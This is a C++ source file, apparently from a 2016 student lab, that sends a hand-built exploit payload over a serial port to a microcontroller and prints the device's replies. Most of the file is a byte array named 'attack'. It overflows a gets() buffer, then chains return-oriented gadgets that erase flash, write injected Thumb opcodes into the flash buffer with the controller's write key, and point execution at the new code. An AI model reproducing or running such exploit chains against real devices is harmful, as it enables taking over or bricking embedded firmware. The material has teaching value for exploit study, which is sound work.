//------------------------------------------------------------------------------------
//
//	Code: PC to uController
//	Authors: Justin Cox & Tyler Travis
//	Date: 2/24/2016
//
//------------------------------------------------------------------------------------

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <Windows.h>
#include "Serial.h"


void readUart(void);

//------------------------------------------------------------------------------------
//	FUNCTION MAIN
//------------------------------------------------------------------------------------

CSerial serial;


int main(){

	//*************************
	//	SERIAL
	//*************************
	int port = 4; 
	int baudRate = 115200; 
	int dispType = 0;

	int nBytesSent = 0;

	const int SIZE = 1073;

	unsigned char attack[SIZE] = {0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,  //Size 64 
								  0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,
								  0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,
								  0x62,0x62,0x62,0x62,0x62,0x62,0xe7,0x1b,0x00,0x01, 
								  0x0C,0x02,0x00,0x20,0xe7,0x1b,0x00,0x01,0x02,0x00,
								  0x42,0xa4,0xe9,0x1b,0x00,0x01,0x08,0xd0,0x0f,0x40,
								  0xc3,0x4a,0x00,0x01, //Flash erase done

								//Size 24 for each opcode block

								//-------------------------------------------------------------------
								//		Delay for Erase
								//-------------------------------------------------------------------
								0x24,0x02,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,

								0x3C,0x02,0x00,0x20, 
								0xe7,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,

								0x54,0x02,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF,
								0xe9,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,

								0x6C,0x02,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x02,0x00,0x00,0x00,  // <-- Clear Interrupt bit for erase
								0xe9,0x1b,0x00,0x01,
								0x14,0xd0,0x0f,0x40, 
								0xc3,0x4a,0x00,0x01,
								

								//-----------------------------
								//	Stack to 0x0000 0000
								//-----------------------------
								0x84,0x02,0x00,0x20,
								0xe7,0x1b,0x00,0x01,
								0x08,0x02,0x00,0x20,  
								0xe9,0x1b,0x00,0x01,
								0x00,0xd1,0x0f,0x40,
								0xc3,0x4a,0x00,0x01,
								
								//-----------------------------
								//	Opcodes
								//-----------------------------
								0x9C,0x02,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x4F,0xF6,0xFF,0x74, // <-- This changes (Opcode 1)
								0xe9,0x1b,0x00,0x01,
								0x04,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0xB4,0x02,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xC0,0xF2,0x0F,0x04, // <-- This changes (Opcode 2)
								0xe9,0x1b,0x00,0x01,
								0x08,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0xCC,0x02,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x4E,0xF2,0x00,0x00, // <-- This changes (Opcode 3)
								0xe9,0x1b,0x00,0x01,
								0x0C,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0xE4,0x02,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xC4,0xF2,0x0F,0x00, // <-- This changes (Opcode 4)
								0xe9,0x1b,0x00,0x01,
								0x10,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0xFC,0x02,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xD0,0xF8,0x08,0x11, // <-- This changes (Opcode 5)
								0xe9,0x1b,0x00,0x01,
								0x14,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0x14,0x03,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x41,0xF0,0x20,0x01, // <-- This changes (Opcode 6)
								0xe9,0x1b,0x00,0x01,
								0x18,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0x2c,0x03,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xC0,0xF8,0x08,0x11, // <-- This changes (Opcode 7)
								0xe9,0x1b,0x00,0x01,
								0x1C,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0x44,0x03,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x45,0xF2,0x00,0x00, // <-- This changes (Opcode 8)
								0xe9,0x1b,0x00,0x01,
								0x20,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0x5c,0x03,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xC4,0xF2,0x02,0x00, // <-- This changes (Opcode 9)
								0xe9,0x1b,0x00,0x01,
								0x24,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0x74,0x03,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x40,0xF2,0x06,0x01, // <-- This changes (Opcode 10)
								0xe9,0x1b,0x00,0x01,
								0x28,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0x8C,0x03,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xC0,0xF2,0x00,0x01, // <-- This changes (Opcode 11)
								0xe9,0x1b,0x00,0x01,
								0x2C,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0xA4,0x03,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xC0,0xF8,0x00,0x14, // <-- This changes (Opcode 12)
								0xe9,0x1b,0x00,0x01,
								0x30,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0xBC,0x03,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xC0,0xF8,0x1C,0x15, // <-- This changes (Opcode 13)
								0xe9,0x1b,0x00,0x01,
								0x34,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0xD4,0x03,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x4F,0xF0,0x06,0x01, // <-- This changes (Opcode 14)
								0xe9,0x1b,0x00,0x01,
								0x38,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0xEC,0x03,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xC0,0xF8,0xFC,0x13, // <-- This changes (Opcode 15)
								0xe9,0x1b,0x00,0x01,
								0x3C,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0x04,0x04,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x4F,0xF0,0x00,0x03, // <-- This changes (Opcode 16)
								0xe9,0x1b,0x00,0x01,
								0x40,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0x1c,0x04,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x03,0xF1,0x01,0x03, // <-- This changes (Opcode 17)
								0xe9,0x1b,0x00,0x01,
								0x44,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0x34,0x04,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xA3,0x42,0xFB,0xDD, // <-- This changes (Opcode 18,19)
								0xe9,0x1b,0x00,0x01,
								0x48,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0x4C,0x04,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x4F,0xF0,0x00,0x01, // <-- This changes (Opcode 20)
								0xe9,0x1b,0x00,0x01,
								0x4C,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0x64,0x04,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xC0,0xF8,0xFC,0x13, // <-- This changes (Opcode 21)
								0xe9,0x1b,0x00,0x01,
								0x50,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0x7C,0x04,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x4F,0xF0,0x00,0x03, // <-- This changes (Opcode 21)
								0xe9,0x1b,0x00,0x01,
								0x54,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0x94,0x04,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x03,0xF1,0x01,0x03, // <-- This changes (Opcode 22)
								0xe9,0x1b,0x00,0x01,
								0x58,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0xAC,0x04,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xA3,0x42,0xFB,0xDD, // <-- This changes (Opcode 23)
								0xe9,0x1b,0x00,0x01,
								0x5C,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0xC4,0x04,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xEA,0xE7,0x00,0x00, // <-- This changes (Opcode 23.5)
								0xe9,0x1b,0x00,0x01,
								0x60,0xd1,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								//-------------------------------------------------------------------
								//		WRITE DATA TO FLASH AND SET PC TO START OF CODE
								//-------------------------------------------------------------------
								0xDC,0x04,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x00,0x00,0x00,0x00, // <-- This changes (Start Address)
								0xe9,0x1b,0x00,0x01,
								0x00,0xd0,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0xF4,0x04,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x01,0x00,0x42,0xa4, // <-- This changes (Write KEY + Exec bit)
								0xe9,0x1b,0x00,0x01,
								0x20,0xd0,0x0f,0x40, // <-- Flash Buffer Address
								0xc3,0x4a,0x00,0x01,

								0x0C,0x05,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x01,0x00,0x42,0xa4, // <-- This changes (Write KEY + Exec bit)
								0xe9,0x1b,0x00,0x01,
								0x20,0xd0,0x0f,0x40, // <-- Flash Buffer Address
								0xe9,0x1b,0x00,0x01,

								//-------------------------------------------------------------------
								//		Delay for write
								//-------------------------------------------------------------------
								0x24,0x05,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,

								0x3C,0x05,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,

								0x54,0x05,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF,
								0xe9,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,

								0x6C,0x05,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF,
								0xe9,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,

								0x84,0x05,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF,
								0xe9,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,

								0x9C,0x05,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF,
								0xe9,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,

								0xb4,0x05,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF,
								0xe9,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,

								0xCC,0x05,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF,
								0xe9,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,

								0xE4,0x05,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF,
								0xe9,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0xe9,0x1b,0x00,0x01,

								0xFC,0x05,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF,
								0xe9,0x1b,0x00,0x01,
								0xFF,0xFF,0xFF,0xFF, 
								0x05,0x00,0x00,0x00,
								'\r'};

								

	//-----------------------------------
	//		SERIAL CODE
	//-----------------------------------
	if (!serial.Open(port, baudRate)){
		printf("Error opening COM port! \n");
		return 0;
	}

	//-----------------------------------
	//	WRITE DATA
	//-----------------------------------
	
	nBytesSent = serial.SendData(attack, SIZE);

	//-----------------------------------
	//	READ DATA
	//-----------------------------------
	
	//Read Data Printed to gets()
	readUart();

	//Read Data from printf()
	readUart();

	serial.Close();

	return 0;
}

void readUart(void){

	int nBytesRead = 0;
	int curT = 0; 
	int oldT = 0;
	char readBuffer[1];
	
	while(readBuffer[0] != '\n')
	{
		curT = GetTickCount();

		if (curT - oldT > 5)
		{
			nBytesRead = serial.ReadData(readBuffer, sizeof(readBuffer));
	
			if (nBytesRead > 0)
			{

				for(int i = 0; i < nBytesRead; i++){
					printf("%c", readBuffer[i]);
				}

			}

			oldT = curT;
		}

	}

}